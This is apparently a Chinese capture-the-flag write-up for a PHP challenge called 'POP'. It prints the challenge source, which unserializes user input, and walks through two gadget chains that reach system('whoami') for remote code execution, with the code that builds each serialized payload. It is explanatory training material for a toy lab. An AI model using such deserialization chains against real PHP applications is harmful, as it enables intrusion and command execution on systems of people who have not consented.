## POP

题目

```php
<?php
highlight_file(FILE);

class Person{
	public $name;
	public $id;
	public $age;
}

class PersonA extends Person{
	public function __destruct(){
		$id = $this->id;
		($this->name)->$id($this->age);
	}
}

class PersonB{
	private $name;.
	private $id;
	private $age;
	public function __set($key, $value){
		$this->name = $value;
	}
	public function __invoke($id){
		$name = $this->id;
		$name->name = $id;
		$name->age = $this->name;
	}
}

class PersonC extends Person{
	public function check($age){
		($this->name)($age);
	}
	public function __wakeup(){
		$name = $this->id;
		$name->age = $this->age;
		$name($this);
	}
}
if(isset(_GET['person'])){
	$person = unserialize(_GET['person']);
}
```

很简单的题目，连豆包都能秒的那种，实现RCE

首先入口肯定是PersonC的`__wakup()`，其中出现了`$name($this)`，自身需要`$this->id`是一个含`__wakeup`的对象($name->age，不能是字符串)，只能是PersonB

出口也是在PersonC的`check()`，有可控的动态执行函数`(this->name)($age)`，但需要可以指定函数名或者现成的check调用，需要PersonA的`__destrut()`

`__wakeup`将C的age通过`__setup`赋值到B的name，而B的`__invoke`的参数是C，将自身id对象的name修改为C，其age修改为自身name（也就是C的age）

很显然B的id是A，A调用C时刚好需要自身的name是C，自身age是为需要执行的命令（当然这些手动设置也是可以的）

构造：

```php
$a=new PersonA();
$a->id="check";
$b=new PersonB();
$b->id=$a;
$c=new PersonC();
$c->age="whoami";
$c->id=$b;
$c->name="system";
$res=urlencode(serialize($c))
```

这应该是正常的解法，但是我做的时候并不是这样的

上面说到A的那几个参数可以自己赋值，不一定要来修改其name和age，但是由于C必须要一个`__invoke`，因此仍然需要B，当我们将A,C全部指定后，B的`__invoke`不能再去修改，因此指定b的id为无关对象Person。(也就是让B不起任何实际作用)

此时以PersonA作为入口。

构造：

```php
$p=new Person();
$b=new PersonB();
$b->id=$p;
$c=new PersonC();
$c->name="system";
$c->id=$b;
$a=new PersonA();
$a->name=$c;
$a->id="check";
$a->age="whoami";
$res=urlencode(serialize($a))
```

::warning

在实际构造的时候，由于B的name，id，age都是私有的，不能直接使用上面的代码，不能像上面那样对b的直接赋值，需要额外处理对B实例赋值的问题，上面的构造代码只是流程示意（当时做的时候我也忘了这茬事...）
